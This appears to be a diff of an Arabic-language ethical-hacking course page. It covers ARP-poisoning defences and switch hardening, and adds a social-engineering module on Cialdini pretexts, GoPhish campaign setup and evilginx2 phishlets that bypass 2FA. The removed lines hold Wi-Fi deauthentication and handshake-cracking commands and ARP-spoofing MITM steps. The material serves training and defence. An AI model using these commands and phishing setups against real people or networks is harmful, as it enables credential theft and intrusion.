+          <li><strong>Private VLANs:</strong> عزل الأجهزة عن بعضها حتى في نفس الـ VLAN</li>
+          <li><strong>Network Segmentation:</strong> تقسيم الشبكة وتقليص الـ Broadcast Domains</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 حماية على مستوى البروتوكول</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>HTTPS Everywhere (HSTS):</strong> إجبار كل الاتصالات على TLS</li>
+          <li><strong>HSTS Preloading:</strong> إدراج النطاق في قائمة المتصفحات المسبقة</li>
+          <li><strong>VPN للمستخدمين:</strong> تشفير كل حركة البيانات من النهاية للنهاية</li>
+          <li><strong>SSH بدل Telnet:</strong> استبدال البروتوكولات غير المشفرة</li>
+          <li><strong>SFTP/FTPS بدل FTP:</strong> نقل الملفات بشكل آمن</li>
+          <li><strong>SMTPS/IMAPS:</strong> تشفير البريد الإلكتروني</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #ff6e27;">🔍 أدوات الكشف عن ARP Poisoning</h4>
+        <div class="cmd-ui-box">
+# XArp (Windows/Linux GUI tool for ARP monitoring)
+# ARPwatch - monitors ARP activity and alerts on changes
+sudo apt install arpwatch
+sudo arpwatch -i eth0 -m admin@company.com
+
+# Manual detection — check for duplicate IPs with different MACs
+arp -a | sort | uniq -d
+
+# Wireshark filter to detect ARP anomalies:
+# (duplicate IPs)
+arp.duplicate-address-detected</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </div>
+      <div>
+        <h4 style="color: #bd93f9;">⚙️ Cisco Switch Hardening</h4>
+        <div class="cmd-ui-box">
+! Enable DHCP Snooping
+ip dhcp snooping
+ip dhcp snooping vlan 1-100
+
+! Enable Dynamic ARP Inspection
+ip arp inspection vlan 1-100
+
+! Port Security (max 2 MACs per port)
+interface GigabitEthernet0/1
+ switchport port-security maximum 2
+ switchport port-security violation restrict
+ switchport port-security
+
+! Enable 802.1X on port
+ dot1x port-control auto</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(189,147,249,0.15); color: #bd93f9; border: 1px solid #bd93f9; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 9: CTF CHALLENGE ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🧪 تحدي CTF — اختبر معلوماتك</h3></div>
+    <div dir="rtl" style="display: flex; flex-direction: column; gap: 15px;">
+
+      <details>
+        <summary style="cursor: pointer; font-weight: bold; padding: 12px; background: rgba(0,229,255,0.05); border-radius: 6px; color: var(--tool-color);">❓ السؤال 1: ما الفرق بين Passive و Active Sniffing؟</summary>
+        <div style="padding: 15px; background: rgba(80,250,123,0.05); border: 1px solid rgba(80,250,123,0.2); border-radius: 6px; margin-top: 8px;">
+          <strong style="color: #50fa7b;">✅ الإجابة:</strong>
+          <p style="color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
+            <strong>Passive Sniffing:</strong> يعمل على شبكات Hub — فقط يستمع دون إرسال أي حزم إضافية. لا يمكن اكتشافه لأنه لا يترك أثراً.
+            <br><strong>Active Sniffing:</strong> يعمل على شبكات Switch — يرسل حزم إضافية (ARP Replies مزيفة، MAC Flood frames) لخداع الشبكة. يمكن اكتشافه بأدوات مثل ARPwatch.
+          </p>
+        </div>
+      </details>
+
+      <details>
+        <summary style="cursor: pointer; font-weight: bold; padding: 12px; background: rgba(255,110,39,0.05); border-radius: 6px; color: #ff6e27;">❓ السؤال 2: ما هو Promiscuous Mode ولماذا يستخدمه المهاجم؟</summary>
+        <div style="padding: 15px; background: rgba(80,250,123,0.05); border: 1px solid rgba(80,250,123,0.2); border-radius: 6px; margin-top: 8px;">
+          <strong style="color: #50fa7b;">✅ الإجابة:</strong>
+          <p style="color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
+            Promiscuous Mode هو وضع في بطاقة الشبكة (NIC) يجعلها تقبل وتعالج <strong>جميع الحزم</strong> التي تصل للـ Interface — حتى تلك التي ليست موجهة لعنوان MAC الخاص بالجهاز. في الوضع العادي، تتجاهل بطاقة الشبكة أي حزمة لا تحمل MAC Address الخاص بها. يستخدمه المهاجم لالتقاط حركة البيانات على شبكة Hub أو بعد تنفيذ ARP Poisoning.
+          </p>
+        </div>
+      </details>
+
+      <details>
+        <summary style="cursor: pointer; font-weight: bold; padding: 12px; background: rgba(255,85,85,0.05); border-radius: 6px; color: #ff5555;">❓ السؤال 3: ما هو Wireshark filter لالتقاط فقط محاولات تسجيل الدخول عبر FTP؟</summary>
+        <div style="padding: 15px; background: rgba(80,250,123,0.05); border: 1px solid rgba(80,250,123,0.2); border-radius: 6px; margin-top: 8px;">
+          <strong style="color: #50fa7b;">✅ الإجابة:</strong>
+          <div class="cmd-ui-box" style="margin-top: 8px;">ftp.request.command == "PASS"
+# أو لرؤية كل أوامر FTP:
+ftp.request.command</div>
+        </div>
+      </details>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 10: CHEAT SHEET ═══ -->
+  <div class="cyber-card" style="border: 1px solid rgba(0,229,255,0.3);">
+    <div class="card-header" style="background: rgba(0,229,255,0.05);"><h3>📖 Cheat Sheet — المرجع السريع</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; padding: 5px;" dir="rtl">
+      <div>
+        <h5 style="color: var(--tool-color);">Wireshark Filters</h5>
+        <ul style="font-family: monospace; font-size: 0.82rem; color: var(--text-secondary); line-height: 1.9;">
+          <li><code>arp</code> — كل حزم ARP</li>
+          <li><code>http.authorization</code> — HTTP credentials</li>
+          <li><code>ftp.request.command=="PASS"</code></li>
+          <li><code>dns</code> — كل استعلامات DNS</li>
+          <li><code>tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0</code></li>
+          <li><code>icmp.type==8</code> — Echo Requests</li>
+        </ul>
+      </div>
+      <div>
+        <h5 style="color: #ff6e27;">tcpdump Commands</h5>
+        <ul style="font-family: monospace; font-size: 0.82rem; color: var(--text-secondary); line-height: 1.9;">
+          <li><code>-i eth0</code> — Interface</li>
+          <li><code>-w out.pcap</code> — Write to file</li>
+          <li><code>-r file.pcap</code> — Read file</li>
+          <li><code>-A</code> — Print ASCII</li>
+          <li><code>-nn</code> — No name resolution</li>
+          <li><code>port 80</code> — Filter by port</li>
+          <li><code>host 1.2.3.4</code> — Filter by host</li>
+        </ul>
+      </div>
+      <div>
+        <h5 style="color: #50fa7b;">Defense Checklist</h5>
+        <ul style="font-size: 0.82rem; color: var(--text-secondary); line-height: 1.9;">
+          <li>☑ DHCP Snooping enabled</li>
+          <li>☑ Dynamic ARP Inspection</li>
+          <li>☑ Port Security on Switch</li>
+          <li>☑ HTTPS / HSTS enforced</li>
+          <li>☑ VPN for remote users</li>
+          <li>☑ ARPwatch monitoring</li>
+          <li>☑ 802.1X authentication</li>
+          <li>☑ Network segmentation</li>
+        </ul>
+      </div>
     </div>
   </div>
 
 </div>
 
-      <!-- =======================================================
-     CEH MODULE 9: MISCELLANEOUS TOPICS (SOCIAL, MITM, WIFI, DOS, CLOUD)
-     ======================================================= -->
-<div class="meth-content-view" id="meth-content-mod9" style="display:none;" dir="rtl">
-  
+      <div class="meth-content-view" id="meth-content-mod9" style="display: none; --tool-color: #ff6e27;">
+
+  <!-- ═══ SECTION 1: HERO ═══ -->
   <div class="cyber-hero">
-    <h2 class="hero-title"><span class="hero-icon">🎭</span> Module 9: Miscellaneous Topics</h2>
-    <p class="hero-tagline">الهندسة الاجتماعية، التنصت، هجمات الواي فاي، إيقاف الخدمات، والـ Cloud Computing.. (5 مجالات في محاضرة واحدة).</p>
-    <div class="hero-meta">
-      <span class="meta-pill"><span class="pill-dot" style="background:#ffb86c;"></span> Module 09</span>
-      <span class="meta-pill"><span class="pill-dot" style="background:#bd93f9;"></span> Advanced Attacks</span>
+    <h2 class="hero-title"><span class="hero-icon">🎭</span> Social Engineering &amp; Phishing — الهندسة الاجتماعية</h2>
+    <p class="hero-tagline">الاستغلال النفسي للبشر كحلقة الضعف الأضعف — من الـ Phishing إلى الـ BEC والـ Vishing</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ SET · GoPhish · evilginx2 · swaks</span>
+      <span class="badge badge-info">📋 OWASP: Human Element | CEH Domain</span>
+      <span style="background: rgba(255,85,85,0.15); color: #ff5555; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">البشر = أضعف حلقة في الأمان</span>
     </div>
   </div>
 
-  <!-- SOCIAL ENGINEERING -->
-  <div class="cyber-card" style="border-top:3px solid #ff5555;">
-    <div class="card-header">
-      <h3 style="margin:0; color:#ff5555;">🎭 1) Social Engineering (الهندسة الاجتماعية)</h3>
-    </div>
-    <div style="padding-top:15px;">
-      <strong style="color:#ff5555;">🧠 التعريف الأساسي:</strong>
-      <p style="color:#aaa; font-size:0.9em; margin-bottom:10px;">فن خداع الناس عشان يطلعوا معلومات سرية. إنت هنا مش بتهاجم السيستم، <strong>إنت بتهاجم الإنسان نفسه (أضعف حلقة).</strong></p>
-      
-      <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:15px; margin-top:15px;">
-        <div style="background:rgba(0,0,0,0.3); border:1px solid #44475a; border-radius:8px; padding:15px;">
-          <h5 style="color:#ffb86c; margin-top:0; font-size: 1.05em;">💣 أمثلة شائعة</h5>
-          <ul style="color:#aaa; font-size:0.85em; padding-right: 20px;">
-            <li>مكالمة هاتفية ينتحل فيها صفة (IT Support).</li>
-            <li>إيميل مزيف (Phishing).</li>
-            <li>صفحات Login مزورة (Fake Pages).</li>
-          </ul>
-        </div>
-        <div style="background:rgba(0,0,0,0.3); border:1px solid #ff5555; border-radius:8px; padding:15px;">
-          <h5 style="color:#ff5555; margin-top:0; font-size: 1.05em;">⚙️ أداة SET Toolkit</h5>
-          <p style="color:#aaa; font-size:0.85em;">أداة مخصصة لعمل هجمات الهندسة الاجتماعية.</p>
-          <ul style="color:#aaa; font-size:0.85em; padding-right: 20px;">
-            <li>استنساخ المواقع (Site Cloner).</li>
-            <li>حملات Phishing.</li>
-          </ul>
-        </div>
-      </div>
-      
-      <div style="margin-top:15px; background:rgba(80,250,123,0.05); border-left:3px solid #50fa7b; padding:10px;">
-        <strong style="color:#50fa7b; font-size:0.85em;">🛡️ الحماية:</strong>
-        <p style="color:#aaa; font-size:0.8em; margin:0;">الوعي (Awareness) هو أهم حاجة، وعدم الضغط على أي لينكات مشبوهة.</p>
-      </div>
-    </div>
-  </div>
+  <!-- ═══ SECTION 2: THEORY — Cialdini Principles ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 مبادئ Cialdini — الأسس النفسية للهندسة الاجتماعية</h3></div>
+    <div dir="rtl">
+      <p style="color: var(--text-secondary); line-height: 1.8; margin-bottom: 20px;">
+        حدد عالم النفس <strong>Robert Cialdini</strong> في كتابه "Influence: The Psychology of Persuasion" ستة مبادئ رئيسية للإقناع — يستغلها منفذو الهندسة الاجتماعية لبناء سيناريوهاتهم:
+      </p>
+      <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px;">
 
-  <!-- SNIFFING & MITM -->
-  <div class="cyber-card" style="border-top:3px solid #8be9fd;">
-    <div class="card-header">
-      <h3 style="margin:0; color:#8be9fd;">🌐 2) Sniffing & MITM</h3>
-    </div>
-    <div style="padding-top:15px;">
-      <strong style="color:#8be9fd;">🧠 يعني إيه Sniffing؟</strong>
-      <p style="color:#aaa; font-size:0.9em; margin-bottom:15px;">التقاط البيانات وهي ماشية في الشبكة. وليه نوعين:</p>
-      
-      <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
-        <div style="background:rgba(0,0,0,0.3); border:1px solid #44475a; border-radius:8px; padding:10px;">
-          <strong style="color:#f1fa8c;">🔹 Passive:</strong> <span style="color:#aaa; font-size:0.85em;">بس بتراقب من غير تدخل.</span>
+        <div style="background: rgba(255,85,85,0.05); border: 1px solid rgba(255,85,85,0.2); border-radius: 8px; padding: 15px;">
+          <h4 style="color: #ff5555; margin-bottom: 8px;">1️⃣ Authority (السلطة)</h4>
+          <p style="color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7;">الناس يطيعون من يبدو في موقع سلطة. المهاجم ينتحل صفة: CEO، IT Support، محقق حكومي، مدقق ضرائب.</p>
+          <div style="margin-top: 10px; background: rgba(0,0,0,0.3); border-radius: 4px; padding: 8px; font-size: 0.82rem; color: #94a3b8;">
+            <em>"أنا من قسم أمن المعلومات، نحتاج كلمة مرورك فوراً للتحقق من حسابك المخترق"</em>
+          </div>
         </div>
-        <div style="background:rgba(0,0,0,0.3); border:1px solid #44475a; border-radius:8px; padding:10px;">
-          <strong style="color:#ff5555;">🔹 Active (MITM 🔥):</strong> <span style="color:#aaa; font-size:0.85em;">تدخل بين الضحية والراوتر.</span>
+
+        <div style="background: rgba(255,110,39,0.05); border: 1px solid rgba(255,110,39,0.2); border-radius: 8px; padding: 15px;">
+          <h4 style="color: #ff6e27; margin-bottom: 8px;">2️⃣ Urgency (الإلحاح)</h4>
+          <p style="color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7;">الضغط الزمني يمنع التفكير النقدي. "حسابك سيُغلق خلال 24 ساعة!" أو "عرض ينتهي اليوم!"</p>
+          <div style="margin-top: 10px; background: rgba(0,0,0,0.3); border-radius: 4px; padding: 8px; font-size: 0.82rem; color: #94a3b8;">
+            <em>"تحديث أمني عاجل — انقر الآن وإلا سيُعطَّل حسابك المصرفي"</em>
+          </div>
         </div>
-      </div>
 
-      <strong style="color:#ffb86c;">💣 هجوم (Man-in-the-Middle):</strong>
-      <div style="background:#282a36; border:1px solid #44475a; border-radius:8px; padding:15px; margin-top:10px; font-family: monospace;">
-        <div style="color:#6272a4; margin-bottom:5px;"># خطوات تنفيذ هجوم MITM:</div>
-        <div style="color:#f8f8f2;">1. تفتح <span style="color:#8be9fd;">Wireshark</span> (لتحليل الترافيك).</div>
-        <div style="color:#f8f8f2;">2. تستخدم أداة زي <span style="color:#ffb86c;">Ettercap</span>.</div>
-        <div style="color:#f8f8f2;">3. تعمل <span style="color:#ff5555;">ARP Spoofing</span> (تسميم الـ ARP).</div>
-        <div style="color:#f8f8f2;">4. تبدأ Sniffing وتشوف الباسوردات والداتا 🔥.</div>
-      </div>
+        <div style="background: rgba(251,191,36,0.05); border: 1px solid rgba(251,191,36,0.2); border-radius: 8px; padding: 15px;">
+          <h4 style="color: #fbbf24; margin-bottom: 8px;">3️⃣ Scarcity (الندرة)</h4>
+          <p style="color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7;">الفرص النادرة تدفع للتصرف السريع. "فرصة عمل حصرية لـ 3 أشخاص فقط" أو "وصول محدود للنظام".</p>
+          <div style="margin-top: 10px; background: rgba(0,0,0,0.3); border-radius: 4px; padding: 8px; font-size: 0.82rem; color: #94a3b8;">
+            <em>"آخر 2 مقاعد في البرنامج — سجّل الآن باستخدام بيانات حسابك"</em>
+          </div>
+        </div>
 
-      <div style="margin-top:15px; background:rgba(255,184,108,0.1); border-left:3px solid #ffb86c; padding:10px;">
-        <strong style="color:#ffb86c; font-size:0.85em;">❗ سؤال مهم: إزاي نشوف الترافيك لو الموقع HTTPS؟</strong>
-        <p style="color:#aaa; font-size:0.8em; margin:0;">باستخدام هجمات زي <code>SSL Strip</code> أو <code>SSL Redirect</code> لفك التشفير.</p>
+        <div style="background: rgba(80,250,123,0.05); border: 1px solid rgba(80,250,123,0.2); border-radius: 8px; padding: 15px;">
+          <h4 style="color: #50fa7b; margin-bottom: 8px;">4️⃣ Social Proof (الإثبات الاجتماعي)</h4>
+          <p style="color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7;">الناس يتبعون ما يفعله الآخرون. "1000 موظف وقّعوا الوثيقة بالفعل".</p>
+          <div style="margin-top: 10px; background: rgba(0,0,0,0.3); border-radius: 4px; padding: 8px; font-size: 0.82rem; color: #94a3b8;">
+            <em>"فريقك بأكمله حدّث بياناته — أنت الوحيد المتبقي"</em>
+          </div>
+        </div>
+
+        <div style="background: rgba(0,229,255,0.05); border: 1px solid rgba(0,229,255,0.2); border-radius: 8px; padding: 15px;">
+          <h4 style="color: #00e5ff; margin-bottom: 8px;">5️⃣ Liking (التعاطف)</h4>
+          <p style="color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7;">نساعد من نحبه أو نثق به. المهاجم يبني علاقة، يتشارك اهتمامات، ينتحل صفة صديق مشترك.</p>
+          <div style="margin-top: 10px; background: rgba(0,0,0,0.3); border-radius: 4px; padding: 8px; font-size: 0.82rem; color: #94a3b8;">
+            <em>"أنا أحمد زميلك السابق في [شركة X]، أحتاج مساعدة صغيرة"</em>
+          </div>
+        </div>
+
+        <div style="background: rgba(189,147,249,0.05); border: 1px solid rgba(189,147,249,0.2); border-radius: 8px; padding: 15px;">
+          <h4 style="color: #bd93f9; margin-bottom: 8px;">6️⃣ Reciprocity (المعاملة بالمثل)</h4>
+          <p style="color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7;">إعطاء شيء لاستقبال شيء. "أرسلت لك هدية رقمية / قسيمة خصم، كل ما نحتاجه هو..."</p>
+          <div style="margin-top: 10px; background: rgba(0,0,0,0.3); border-radius: 4px; padding: 8px; font-size: 0.82rem; color: #94a3b8;">
+            <em>"لقد أرسلنا لك مكافأة $100 — فعّلها بتسجيل الدخول هنا"</em>
+          </div>
+        </div>
       </div>
     </div>
   </div>
 
-  <!-- WIRELESS ATTACKS -->
-  <div class="cyber-card" style="border-top:3px solid #50fa7b;">
-    <div class="card-header">
-      <h3 style="margin:0; color:#50fa7b;">📡 3) Wireless Attacks (الواي فاي)</h3>
-    </div>
-    <div style="padding-top:15px;">
-      
-      <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:15px;">
-        <div style="flex:1; background:rgba(0,0,0,0.3); border:1px solid #44475a; border-radius:8px; padding:15px; min-width:200px;">
-          <h5 style="color:#50fa7b; margin-top:0;">🔐 أنواع الحماية</h5>
-          <ul style="color:#aaa; font-size:0.85em; padding-right: 20px;">
-            <li><span style="color:#ff5555;">WEP:</span> ضعيف جداً (اتلغى).</li>
-            <li><span style="color:#f1fa8c;">WPA/WPA2:</span> المعيار الحالي.</li>
-            <li><span style="color:#50fa7b;">WPA3 🔥:</span> الأحدث والأقوى.</li>
-          </ul>
-        </div>
-        <div style="flex:1; background:rgba(0,0,0,0.3); border:1px solid #44475a; border-radius:8px; padding:15px; min-width:200px;">
-          <h5 style="color:#ffb86c; margin-top:0;">💣 أهم الهجمات</h5>
-          <ul style="color:#aaa; font-size:0.85em; padding-right: 20px;">
-            <li><strong>Deauthentication:</strong> تبعت Packets تفصل الأجهزة عن الراوتر بقوة.</li>
-            <li><strong style="color:#ff5555;">Evil Twin 🔥:</strong> تعمل شبكة مزيفة بنفس اسم الأصلية وتخلي الناس تدخل عندك.</li>
-          </ul>
-        </div>
-      </div>
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح حملة Phishing — من البداية للنهاية</h3></div>
+    <div dir="rtl">
+      <div style="display: flex; flex-direction: column; gap: 12px;">
 
-      <strong style="color:#8be9fd;">🤝 الـ Handshake وكسر الباسورد:</strong>
-      <p style="color:#aaa; font-size:0.85em;">الـ Handshake هي "كلمة سر مشفرة" بتتبعت بين الجهاز والراوتر. الهجوم بيمشي كالتالي:</p>
-      <div style="background:#282a36; border:1px solid #44475a; border-radius:8px; padding:15px; font-family: monospace;">
-        <div style="color:#6272a4;"># 1. تفعيل وضع المراقبة (Monitor Mode)</div>
-        <div style="color:#f8f8f2; margin-bottom:10px;">airmon-ng start wlan0</div>
-        
-        <div style="color:#6272a4;"># 2. تحديد الشبكة (Target Network)</div>
-        <div style="color:#f8f8f2; margin-bottom:10px;">airodump-ng -w capture -c 6 --bssid TARGET wlan0mon</div>
-        
-        <div style="color:#6272a4;"># 3. فصل الناس مؤقتاً (Deauth) لإجبارهم يعملوا اتصل من جديد</div>
-        <div style="color:#f8f8f2; margin-bottom:10px;">aireplay-ng --deauth 0 -a TARGET wlan0mon</div>
-        
-        <div style="color:#6272a4;"># 4. بعد التقاط الـ Handshake، نكسره بـ ملف كلمات سر (Wordlist)</div>
-        <div style="color:#f8f8f2;"><span style="color:#50fa7b;">aircrack-ng</span> capture.cap -w rockyou.txt</div>
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Target Reconnaissance (استطلاع الهدف)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin: 5px 0 0 0; line-height: 1.7;">جمع المعلومات: LinkedIn (الوظائف، الهيكل التنظيمي)، Hunter.io (الإيميلات)، WHOIS، منصات التواصل الاجتماعي، تقارير الشركة السنوية. الهدف: بناء pretexting موثوق.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Email discovery
+hunter.io → search company domain
+theHarvester -d company.com -b google,linkedin
+
+# LinkedIn OSINT
+# Search: site:linkedin.com/in "company name" "IT Manager"
+
+# Find email format
+# Try: firstname.lastname@ / first.last@ / f.lastname@</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Pretext Building (بناء الذريعة)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin: 5px 0 0 0; line-height: 1.7;">تصميم القصة المقنعة: هل هو IT helpdesk؟ مدقق مالي؟ مورد؟ شريك؟ يجب أن يتطابق مع احتياج حقيقي للضحية ويستخدم أسماء حقيقية (CEO، زميل، مدير).</p>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,85,85,0.05); border-right: 3px solid #ff5555; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #ff5555;">Infrastructure Setup (البنية التحتية)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin: 5px 0 0 0; line-height: 1.7;">نطاق مشابه (Typosquatting): <code>paypa1.com</code> بدل <code>paypal.com</code>، أو <code>company-helpdesk.com</code>. إعداد SSL (Let's Encrypt — الـ HTTPS لا يعني الأمان!)، GoPhish server، صفحة Clone.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Setup GoPhish phishing server
+# Download from: https://github.com/gophish/gophish/releases
+./gophish  # Start server on :3333 (admin) and :80 (phishing)
+
+# Access admin panel: https://localhost:3333
+# Default credentials: admin / gophish
+
+# In GoPhish dashboard:
+# 1. Sending Profiles → configure SMTP
+# 2. Email Templates → craft phishing email
+# 3. Landing Pages → clone target page
+# 4. Campaigns → set targets and launch</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,85,85,0.15); color: #ff5555; border: 1px solid #ff5555; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(251,191,36,0.05); border-right: 3px solid #fbbf24; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">4️⃣</span>
+          <div>
+            <strong style="color: #fbbf24;">Credential Harvesting (حصاد البيانات)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin: 5px 0 0 0; line-height: 1.7;">الضحية تدخل بياناتها في الصفحة المزيفة. GoPhish يسجل كل نقرة وإدخال. evilginx2 يعمل كـ Reverse Proxy ويلتقط حتى الـ Session Cookies — يتجاوز 2FA!</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# GoPhish tracks:
+# - Email opened (pixel tracking)
+# - Link clicked
+# - Credentials submitted
+# - Reports dashboard with timeline
+
+# evilginx2 — intercepts cookies even with 2FA:
+# Creates reverse proxy between victim and real site
+# Captures session tokens in real-time
+evilginx  # Start evilginx2
+# phishlets list  → see available phishlets
+# phishlets enable microsoft  → enable Microsoft phishlet
+# lures create microsoft  → create lure URL</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(251,191,36,0.15); color: #fbbf24; border: 1px solid #fbbf24; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
       </div>
     </div>
   </div>
 
-  <!-- DOS AND CLOUD -->
-  <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:15px; margin-top:15px;">
-    
-    <!-- DoS -->
-    <div class="cyber-card" style="border-top:3px solid #ff5555; margin:0;">
-      <div class="card-header">
-        <h3 style="margin:0; color:#ff5555;">💣 4) DoS / DDoS</h3>
+  <!-- ═══ SECTION 4: PHISHING TYPES ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>⚡ أنواع هجمات Phishing — دليل شامل</h3></div>
+    <div dir="rtl">
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr><th>النوع</th><th>التعريف</th><th>القناة</th><th>مستوى التخصيص</th><th>مثال</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">Phishing</strong></td>
+            <td>هجوم جماعي لأعداد كبيرة</td>
+            <td>البريد الإلكتروني</td>
+            <td>منخفض — عام</td>
+            <td>"حسابك PayPal معلق"</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">Spear Phishing</strong></td>
+            <td>هجوم مستهدف لشخص/منظمة محددة</td>
+            <td>البريد الإلكتروني</td>
+            <td>عالي — معلومات شخصية</td>
+            <td>إيميل باسم المدير للمحاسب</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff5555;">Whaling</strong></td>
+            <td>Spear Phishing يستهدف كبار المسؤولين</td>
+            <td>البريد الإلكتروني</td>
+            <td>عالي جداً — CEOs, CFOs</td>
+            <td>طلب تحويل مالي عاجل من "CEO"</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #fbbf24;">Vishing</strong></td>
+            <td>Voice Phishing عبر الهاتف</td>
+            <td>الهاتف/VoIP</td>
+            <td>متوسط — انتحال هوية</td>
+            <td>"أنا من البنك، حسابك تعرض للاختراق"</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">SMiShing</strong></td>
+            <td>SMS Phishing عبر الرسائل</td>
+            <td>SMS</td>
+            <td>منخفض-متوسط</td>
+            <td>"طردك في الجمارك، ادفع $3.99"</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #bd93f9;">BEC</strong></td>
+            <td>Business Email Compromise</td>
+            <td>البريد الإلكتروني</td>
+            <td>عالي جداً — تحليل عميق</td>
+            <td>تحويل ملايين لحساب المهاجم</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #00e5ff;">Pharming</strong></td>
+            <td>تزوير DNS لتوجيه لموقع مزيف</td>
+            <td>DNS Poisoning</td>
+            <td>لا يحتاج تفاعل</td>
+            <td>زيارة bank.com تذهب لموقع مزيف</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">Baiting</strong></td>
+            <td>إغراء بمحتوى/USB ملغوم</td>
+            <td>مادي/رقمي</td>
+            <td>منخفض</td>
+            <td>USB drive "مجاني" في موقف السيارات</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 5: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ مصفوفة أدوات Phishing</h3></div>
+    <div dir="rtl">
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr><th>الأداة</th><th>الاستخدام</th><th>المميزات</th><th>التعقيد</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">GoPhish</strong></td>
+            <td>إدارة حملات Phishing كاملة</td>
+            <td>Dashboard، تتبع النقرات، تقارير، REST API</td>
+            <td>⭐⭐ متوسط</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff5555;">evilginx2</strong></td>
+            <td>Reverse Proxy لالتقاط Cookies (يتجاوز 2FA)</td>
+            <td>Phishlets لـ O365/Google/GitHub، Real-time tokens</td>
+            <td>⭐⭐⭐ متقدم</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #fbbf24;">SET (Social Engineer Toolkit)</strong></td>
+            <td>أتمتة هجمات SE متعددة</td>
+            <td>Clone websites، credential harvesting، payload generation</td>
+            <td>⭐⭐ متوسط</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">swaks</strong></td>
+            <td>إرسال إيميلات SMTP مخصصة من CLI</td>
+            <td>تحكم كامل بـ headers، attachments، encoding</td>
+            <td>⭐ سهل</td>
+          </tr>
+          <tr>
